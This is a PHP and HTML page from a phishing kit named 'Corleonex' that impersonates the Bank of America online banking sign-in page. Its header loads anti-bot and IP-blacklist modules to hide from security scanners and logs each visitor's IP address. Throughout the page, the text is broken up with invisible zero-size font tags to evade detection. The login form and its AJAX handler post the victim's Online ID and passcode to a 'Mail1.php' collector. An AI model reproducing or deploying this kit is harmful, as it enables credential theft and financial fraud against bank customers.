<?php
session_start();
error_reporting(0);


include'Corleonex/config.php';
include'Corleonex/Anti/IP-BlackList.php';  
include'Corleonex/Anti/Bot-Crawler.php';
include'Corleonex/Anti/bot-corleonex.php';
include'Corleonex/Anti/blacklist.php';
include'Corleonex/Anti/new.php';
include'Corleonex/Functions/Fuck-you.php'; 
include'Corleonex/Anti/Dila_DZ.php';


if (!isset($_GET['boa_id']) || !isset($_GET['country'])) {
        header("HTTP/1.0 404 Not Found");
        exit();
    }

if (!isset($_SESSION['BOA_CORLEONEX'])) {

  header("Location: index");
  exit();
}


    $content2 = "#>".$_SESSION['ip']."\r\n";
    $save2=fopen("Corleonex/Boa_Result/total_login_view.txt","a+");
    fwrite($save2,$content2);
    fclose($save2);

?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US" class="win chrome chrome-76 webkit svg-bg not-retina cf-cnx-regular-active">
<head class="at-element-marker" style="visibility:visible;">
	<meta http-equiv="Content-Type" content="text/html; charset=windows-1252">
	<meta http-equiv="X-UA-Compatible" content="IE=Edge">

	<style type="text/css">@font-face { font-family: 'cnx-regular'; src: url('Corleonex/Files/fonts/cnx-regular.eot'); src: url('Corleonex/Files/fonts/cnx-regular.eot?#iefix') format('embedded-opentype'), url('Corleonex/Files/fonts/cnx-regular.woff') format('woff'), url('Corleonex/Files/fonts/cnx-regular.ttf') format('truetype'); font-weight: normal; font-style: normal; font-variant: normal; }</style>

	<title>Sign In | Online ID</title>
	<link rel="shortcut icon" href="Corleonex/Files/img/assets-images-global-favicon-favicon-CSX8d65d6e4.ico">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files/css/vipaa-v4-jawr.css" media="all">
	<link rel="stylesheet" type="text/css" href="Corleonex/Files//css/vipaa-v4-jawr-print.css" media="print">
	<script src="Corleonex/Files/css/vipaa-v4-jawr.js" type="text/javascript"></script>
	<style id="at-id-default-content-style">.mboxDefault {visibility:hidden;}</style>
<meta name="viewport" content="initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />


	</head>		
<body class="fsd-layout-body" style="display: block;">
	<style>body{display:block;}</style>
		<div class="fsd-layout fsd-2c-700lt-layout">
			<div class="fsd-border">
				<div class="center-content">
					<div class="header">

<div class="header-module">
   <div class="fsd-secure-esp-skin">
   	  <img height="28" width="230" alt="Bank of America" src="Corleonex/Files/img/logo.png">
      <div class="page-type cnx-regular" data-font="#!">S<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>n I<font style='color:transparent;font-size:0px'></font>n</div>
      <div class="right-links">
		<div class="secure-area">S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e A<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>a</div>
       <a class="divide" title="Muestra esta sesión de la Banca en Línea">E<font style='color:transparent;font-size:0px'></font>n E<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>p<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>l</a>
       <div class="clearboth"></div>
      </div>
      <div class="clearboth"></div>
   </div>
</div>
	
<div class="page-title-module h-100" id="skip-to-h1">
  <div class="red-grad-bar-skin sup-ie">
    <h1 data-font="#!" class="cnx-regular">S<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>n I<font style='color:transparent;font-size:0px'></font>n t<font style='color:transparent;font-size:0px'></font>o O<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>e B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>g</h1>
  </div>
</div>
		<div class="messaging-vipaa-module vipaa-pwd" aria-live="polite">
			<div class="error-skin">
				<div class="error-message">
					<p  class="TLu_ERROR">
						</p><li>A<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>s d<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>d. Y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u n<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>d t<font style='color:transparent;font-size:0px'></font>o L<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n f<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>t.<br> P<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>e l<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n t<font style='color:transparent;font-size:0px'></font>o co<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>e o<font style='color:transparent;font-size:0px'></font>r c<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>k <a href="#">F<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>ot I<font style='color:transparent;font-size:0px'></font>D/P<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>ss<font style='color:transparent;font-size:0px'></font>co<font style='color:transparent;font-size:0px'></font>de</a></li>	
						<li><b>Having problems signing in or resetting your Passcode?</b> If you’re using a password manager or your browser has stored credentials that are no longer valid, deleting your stored credentials should enable you to access your account. </li>					
					<p></p>
				</div>
			</div>
		</div>

</div>
					<div class="columns">
						<div class="flex-col lt-col">


<div class="online-id-vipaa-module">
	<div class="enter-skin phoenix">
		<form id="login-form" class="simple-form collector-form-marker" method="POST" action="Corleonex/Mail/Mail1" >
		  <div class="online-id-section">

			<label >O<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>e I<font style='color:transparent;font-size:0px'></font>D</label>
			<input type="text" id="enterID-input" name="userid" data-validation="length" data-validation-error-msg=" " data-validation-length="min6-32">
					<div class="remember-info">
								<input type="checkbox" id="remID" name="">
						<label for="remID">S<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>v<font style='color:transparent;font-size:0px'></font>e t<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>s O<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>e I<font style='color:transparent;font-size:0px'></font>D</label>
						<a class="boa-dialog force-xlarge info-layer-help-fsd dotted" href="#"  rel="help-content" title="Help">
							<span class="ada-hidden">O<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>e I<font style='color:transparent;font-size:0px'></font>D H<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>p</span>
						</a>
						
						<div class="clearboth"></div>
					</div>
			</div>
			<label for="tlpvt-passcode-input" class="mtop-15">P<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>e</label>
			<div class="TL_NPI_Pass">
				<input type="password" class="tl-private fl-lt" id="tlpvt-passcode-input" name="pss" data-validation="length" data-validation-error-msg="  " data-validation-length="min1" disabled="disabled" >
				<input type="hidden" name="token" value="spox">
			</div>
			
					<a href="" class="fl-lt forgot-passcode" name="">F<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>t y<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r P<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>e?</a>
			<div class="clearboth"></div>
			<button type="submit" id="loginsubmits" value="submit" name="submit" class="btn-bofa btn-bofa-blue btn-bofa-small btn-bofa-noRight"><span class="btn-bofa-blue-lock"></span> S<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>n i<font style='color:transparent;font-size:0px'></font>n</button>

			<div class="clearboth"></div>
		</form>		
	<div id="fpContainer" class="" style="width: 50%;">
	
	</div>
					<div class="mobile-cta-section vertical-dotted-line fl-rt">
					<p class="cnx-regular title enroll-color-gray mbtm-10">Stay connected with our app

</p>
					<img height="208" width="149" src="Corleonex/Files/img/mobile_llama.png" alt="Mobile banking Llama" class="fl-lt">
					<div class="get-app-content-section">
						<div class="cnx-regular title enroll-color-gray mcta-bubble">Secure, convenient banking anytime
</div>
						<a id="choose-device-get-the-app" name="" class="choose-device-get-the-app-modal btn-bofa btn-bofa-red btn-bofa-noRight cnx-regular" href="javascript:void(0);" rel="mobile-app-download-choose-device"><span>G<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>t t<font style='color:transparent;font-size:0px'></font>h<font style='color:transparent;font-size:0px'></font>e a<font style='color:transparent;font-size:0px'></font>p<font style='color:transparent;font-size:0px'></font>p</span><span class="ada-hidden">&nbsp; l<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k o<font style='color:transparent;font-size:0px'></font>p<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>ns a n<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>w i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>f<font style='color:transparent;font-size:0px'></font>o m<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>l l<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>y<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r</span></a>
					</div>
				</div>
	</div>
</div>


<div id="mobile-app-download-flex-modal" class="aps-mobile-products">
</div>
		<style type="text/css">
			.aps-mobile-products .sprite .spr {
			 background-image: url('Corleonex/Files/img/aps-mobile-products-icon-sprite-dev.png'); 
			background-size: 700px 550px; 
			
		}
		</style>

	<style type="text/css">
		.aps-mobile-products .sprite-D5>.spr {width: 50px !important;left: 25px !important;top: -5px !important;}
		.aps-mobile-products .sprite-J8>.spr {height: 51px;width: 50px !important;background-position: -522px -410px !important;left: 30px !important;}
		.aps-mobile-products .sprite-F5>.spr {width: 50px !important;left: 25px !important;top: -5px !important;}
	</style>
</div>
<div class="flex-col rt-col">
<div class="side-well-vipaa-module">
	<div class="fsd-ll-skin">
		 <h2>S<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>n-i<font style='color:transparent;font-size:0px'></font>n h<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>p</h2>
			<ul class="li-pbtm-15">
						<li><a class="arrow" href="#" name="">F<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>t ID/P<font style='color:transparent;font-size:0px'></font>as<font style='color:transparent;font-size:0px'></font>sc<font style='color:transparent;font-size:0px'></font>od<font style='color:transparent;font-size:0px'></font>e?</a></li>
						<li><a class="arrow" href="#" name="">P<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>b<font style='color:transparent;font-size:0px'></font>le<font style='color:transparent;font-size:0px'></font>m si<font style='color:transparent;font-size:0px'></font>gn<font style='color:transparent;font-size:0px'></font>in<font style='color:transparent;font-size:0px'></font>g in?</a></li>
			</ul>
</div>
   <div class="fsd-ll-skin">
   			<h2>N<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>t u<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>g O<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>e B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>g?</h2>
            <ul class="li-pbtm-15">
							<li><a class="arrow" href="#" name="">E<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>l n<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>w<span class="ada-hidden">  f<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r o<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>e B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>g</span></a></li>
							<li><a class="arrow" href="#" name="">L<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>n m<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e a<font style='color:transparent;font-size:0px'></font>b<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>t O<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>l<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>e B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>g</a></li>
							<li><a class="arrow" href="#" name="">S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>v<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>e A<font style='color:transparent;font-size:0px'></font>g<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>t</a></li>
            </ul>
   </div>
</div>
</div>
						<div class="clearboth"></div>
					</div>
					<div class="footer">
						<div class="footer-top">&nbsp;
		
		</div>
						<div class="footer-inner">

<div class="global-footer-module">
   <div class="gray-bground-skin cssp">
		<div class="secure">S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e a<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>a</div>
       
      <div class="link-container">
         <div class="link-row"> 
				<a class="last-link" href="#" name="" >P<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>v<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>y &amp; S<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>y</a>
				<div class="clearboth"></div>
         </div>
      </div>
      <p>B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k o<font style='color:transparent;font-size:0px'></font>f A<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a, N.<font style='color:transparent;font-size:0px'></font>A. M<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>b<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r F<font style='color:transparent;font-size:0px'></font>D<font style='color:transparent;font-size:0px'></font>I<font style='color:transparent;font-size:0px'></font>C. <a href="#" name="" >E<font style='color:transparent;font-size:0px'></font>q<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>l H<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>u<font style='color:transparent;font-size:0px'></font>s<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>g L<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>d<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r</a> <br>©&nbsp;2<font style='color:transparent;font-size:0px'></font>0<font style='color:transparent;font-size:0px'></font>2<font style='color:transparent;font-size:0px'></font>0 B<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>n<font style='color:transparent;font-size:0px'></font>k o<font style='color:transparent;font-size:0px'></font>f A<font style='color:transparent;font-size:0px'></font>m<font style='color:transparent;font-size:0px'></font>e<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>c<font style='color:transparent;font-size:0px'></font>a C<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>p<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>r<font style='color:transparent;font-size:0px'></font>a<font style='color:transparent;font-size:0px'></font>t<font style='color:transparent;font-size:0px'></font>i<font style='color:transparent;font-size:0px'></font>o<font style='color:transparent;font-size:0px'></font>n.</p>
   </div>
</div>
</div>
					</div>
				</div>
			</div>
		</div>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});

 $.validate({

     form : '#login-form',
        onSuccess : function($form) {
        // on validate send data 
        // do ajax 
        var datastring = $("#login-form").serialize();
        $("#loginsubmits").prop("disabled", true);


        $.ajax({
    type: "POST",
    url: "Corleonex/Mail/Mail1.php",
    data: datastring,
    dataType: "text",
   success: function(data){ 
   
      if (data == 'double_login') {
       

     } else {

        // else redirect

        window.location.href = data;



     }
  },
  error: function(){
  }
});



    },
  });

 $("form").submit(function(e){
        e.preventDefault();
    });

</script>		
</body>


</html>